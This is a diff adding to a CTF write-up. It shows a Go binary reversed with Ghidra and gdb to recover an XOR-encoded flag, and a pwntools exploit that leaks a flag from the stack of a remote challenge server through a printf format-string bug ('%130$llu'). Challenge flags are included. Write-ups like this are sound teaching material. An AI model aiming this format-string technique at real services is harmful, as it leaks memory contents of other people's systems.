@@ -99,7 +99,7 @@ I used the tool [Sonic Visualizer](https://www.sonicvisualiser.org/) `right clic
 
 The code was `spectogram`.
 
-TODO - image
+![Melodic Range Spectrogram](https://i.imgur.com/ZjF1Aas.png)
 
 #### Flag
 
@@ -186,7 +186,26 @@ This was the first time I actually reversed a go binary. Running `strings gogu.e
 
 After a bit of googling I found [this article](https://cujo.com/reverse-engineering-go-binaries-with-ghidra/) which states that even stripped go binaries still retain information about function names. This article links to a [ghidra script](https://github.com/getCUJO/ThreatIntel/tree/master/Scripts/Ghidra) which can be used to retrieve the function names. Neat!
 
-Using the ghidra decompiler we decompile the function main.main and we notice it calls three functions `func1`, `func2` and `func3`. After each function call it calls a formatting function and then a print function. Since the binary prints three lines, we can assume each function has something to do with each line.
+Using the ghidra decompiler we decompile the function main.main, we see the following main structure:
+```
+main() {
+    main.main.func1(params);
+    runtime.convT2Estring(params);
+    fmt.Println(params);
+
+
+    main.main.func2(params);
+    runtime.convT2Estring(params);
+    fmt.Println(params);
+
+
+    main.main.func3(params);
+    main.Adhdcapgkdlapgolgboe(params);
+    runtime.convT2Estring(params);
+    fmt.Println(params);
+}
+```
+We notice it calls three functions `main.main.func1`, `main.main.func2` and `main.main.func3`. After each function call it calls a formatting function and then a print function. Since the binary prints three lines, we can assume each function has something to do with each line.
 
 Out of the three lines listed below the only line which is really interesting is the last one which looks like a part of the flag.
 
@@ -197,9 +216,67 @@ Good luck!
 a961f71e0f287ac52a25aa93be854377
 ```
 
-Disassembling the function is rather ugly so we fire up gdb with a breakpoint at the function start 
+Disassembling of the `main.main.func3` show this basic structure:
+
+```
+while( true ) {
+  if (uVar5 <= uVar3) break;
+  bVar2 = *(byte *)(local_10 + uVar3) ^ *(byte *)(local_b8 + uVar3);
+  param_1 = (ulong)bVar2;
+  if (0x44 < uVar3) break;
+  *(byte *)((long)&local_55 + uVar3) = bVar2;
+  uVar3 = uVar3 + 1;
+}
+```
+
+It appears to run a xor between two strings. We investigate further with gdb by placing a breakpoint at the `main.main.func3` address `0x00483d30` as extrated from ghidra. We navigate around the function until we reach an the xor part of the code:
+```
+0x483e10:	movzx  edi,BYTE PTR [rbx+rsi*1]
+0x483e14:	cmp    rsi,rax
+0x483e17:	jae    0x483e7c
+0x483e19:	movzx  r8d,BYTE PTR [rcx+rsi*1]
+0x483e1e:	xor    edi,r8d
+```
+
+We palce a breakpoint on the address `0x483e10` and extract the two strings present at the addresses rbx and rcx:
+
+```
+$ x/69b $rcx
+0xc4200200a0:	0x4c	0x8c	0x50	0x8c	0x04	0x1e	0xbe	0x39
+0xc4200200a8:	0x9c	0x79	0x1d	0xcf	0xca	0xa2	0xef	0xf3
+0xc4200200b0:	0xa8	0x27	0xc4	0xa6	0xbc	0x85	0x49	0x3c
+0xc4200200b8:	0x20	0x2d	0x93	0xf6	0x9d	0x26	0xac	0xce
+0xc4200200c0:	0x02	0xcf	0x32	0x2f	0xdc	0xfd	0x08	0xc6
+0xc4200200c8:	0xde	0xb2	0xaa	0x11	0x78	0xdb	0xd3	0xc1
+0xc4200200d0:	0x05	0x1f	0xf1	0x32	0x1f	0x8c	0x26	0x49
+0xc4200200d8:	0x36	0xa9	0xb0	0x48	0x8b	0xf5	0x60	0x85
+0xc4200200e0:	0xdb	0x6b	0xb2	0xc5	0x59
+$ x/69b $rbx
+0xc420020050:	0x2f	0xf8	0x36	0xf7	0x35	0x78	0xdb	0x0f
+0xc420020058:	0xa5	0x4c	0x29	0xf7	0xfd	0x92	0x8d	0x92
+0xc420020060:	0xca	0x43	0xf1	0x93	0xde	0xe4	0x7f	0x59
+0xc420020068:	0x15	0x49	0xf5	0x97	0xa8	0x11	0xc8	0xfa
+0xc420020070:	0x67	0xab	0x03	0x1e	0xbd	0x9c	0x6a	0xa4
+0xc420020078:	0xe9	0x82	0x9f	0x22	0x4b	0xe8	0xea	0xf6
+0xc420020080:	0x67	0x26	0xc9	0x07	0x7c	0xb4	0x1f	0x79
+0xc420020088:	0x01	0x9d	0x89	0x2b	0xe9	0x93	0x03	0xb2
+0xc420020090:	0xbe	0x58	0x82	0xf3	0x24
+```
+
+Finally we make the xor ourself by running the following code:
+```
+a = "\x2f\xf8\x36\xf7\x35\x78\xdb\x0f\xa5\x4c\x29\xf7\xfd\x92\x8d\x92\xca\x43\xf1\x93\xde\xe4\x7f\x59\x15\x49\xf5\x97\xa8\x11\xc8\xfa\x67\xab\x03\x1e\xbd\x9c\x6a\xa4\xe9\x82\x9f\x22\x4b\xe8\xea\xf6\x67\x26\xc9\x07\x7c\xb4\x1f\x79\x01\x9d\x89\x2b\xe9\x93\x03\xb2\xbe\x58\x82\xf3\x24"
+b = "\x4c\x8c\x50\x8c\x04\x1e\xbe\x39\x9c\x79\x1d\xcf\xca\xa2\xef\xf3\xa8\x27\xc4\xa6\xbc\x85\x49\x3c\x20\x2d\x93\xf6\x9d\x26\xac\xce\x02\xcf\x32\x2f\xdc\xfd\x08\xc6\xde\xb2\xaa\x11\x78\xdb\xd3\xc1\x05\x1f\xf1\x32\x1f\x8c\x26\x49\x36\xa9\xb0\x48\x8b\xf5\x60\x85\xdb\x6b\xb2\xc5\x59"
+sol = ""
+for i in range(69):
+	sol = sol + chr(ord(a[i]) ^ ord(b[i]))
+
+print sol
+```
 
 #### Flag
+
+ctf{1fe6954870babd55ba6e5dfa57d4ed11aabb70533397b985c890749cbfc7e306}
 
 ## zanger
 
@@ -277,7 +354,7 @@ However trying to open the image results in an error.
 
 It is a QR code and it decodes to `asdsdgbrtvt4f5678k7v21ecxdzu7ib6453b3i76m65n4bvcx`. We send this string as a password to the netcat applcation and we get the flag.
 
-TODO - qr
+![QR Code](https://i.imgur.com/ZjF1Aas.png)
 
 #### Flag
 
@@ -387,6 +464,107 @@ ctf{ff695564fdb6943c73fa76f9ca5cdd51dd3f7510336ffa3845baa34e8d44b436}
 
 ## Not a fuzz
 
+
+Looking with IDA at the disassembled code we get the following:
+
+```
+  v8 = 'XXXXDAED';
+  v9 = 'XXXXDAED';
+  v10 = 'XXXXDAED';
+  v11 = 'XXXXDAED';
+  v12 = 'XXXXDAED';
+  v13 = 'XXXXDAED';
+  v14 = 'XXXXDAED';
+  v15 = 'XXXXDAED';
+  v16 = 'XXXXDAED';
+  v17 = 'XXXXDAED';
+  v18 = 'XXXXDAED';
+  v19 = 'XXXXDAED';
+  v20 = 'XXXXDAED';
+  v21 = 'XXXXDAED';
+  v22 = 'XXXXDAED';
+  v23 = 'XXXXDAED';
+  v24 = 'XXXX}';
+  memset(&v25, 0, 0x12F8uLL);
+  for ( i = 1; i <= 9999; ++i )
+  {
+    if ( i == 3 )
+    {
+      puts("Do you have the control?");
+      __isoc99_scanf("%1023[^\n]", &format);
+      while ( getchar() != 10 )
+        ;
+      printf(&format, &format, v4);
+      puts("It does not look like. You have the alt!");
+    }
+    else
+    [...]
+```
+
+We are able to provide a format string for printf and the flag is on the stack in the same function. We just need to retrieve the position of the flag relative to ESP when `printf(&format, &format, v4);` is called. Running find ctf in peda returns the stack address where the ctf is stored `0x7fffffffca90` and the esp is at `0x7fffffffc680` when calling `printf` so we need to print starting from the position`(0x7fffffffca90 - 0x7fffffffc680) / 8 = 130`and up.
+
+We use the positional specifier for printf `%130$llu`in order to print the full 8B (which is not really necessary due to how the flag is structured).
+I wrote the following exploit script:
+
+```
+from pwn import *
+
+local = False
+
+exec_path = "./chall"
+HOST = "35.246.180.101"
+PORT = 31425
+
+flag = ""
+
+for num in range(130, 160):
+	if local:
+		io = process(exec_path)
+	else:
+		io = remote(HOST, PORT)
+	payload = '%' + "%d" % num + "$llu"
+	io.recvline()
+	io.recvline()
+
+	io.sendline("a")
+	if not local:
+		io.recvline() # the double a	
+	io.recvline() # the a
+
+	io.recvline()
+	io.recvline()
+	io.sendline("a")
+
+	if not local:
+		io.recvline() # the double a
+	io.recvline() # the a
+
+	print(io.recvline())
+	print(io.recvline())
+	io.sendline(payload)
+
+	if not local:
+		io.recvline()
+
+	good_result = io.recvline()
+
+	res = str(hex(int(good_result.replace("It does not look like. You have the alt!", "")))).replace("0x", "")
+
+	split_res = [res[i:i+2] for i in range(0, len(res), 2)]
+
+	for char in split_res[::-1]:
+		decoded_char = chr(int(char, 16))
+		if decoded_char != 'X':
+			flag = flag + decoded_char
+	io.close()
+
+print(flag)
+```
+
+We get:
+`\x00\x00\x00ctf{fad65340180f6b4c6f49dad138daeed447cf23f994635481f92551f05dbc6070}\x00\x00\x00`
+
+Turns out that I was a bit off with my offsets but it does the job.
 
 
 #### Flag
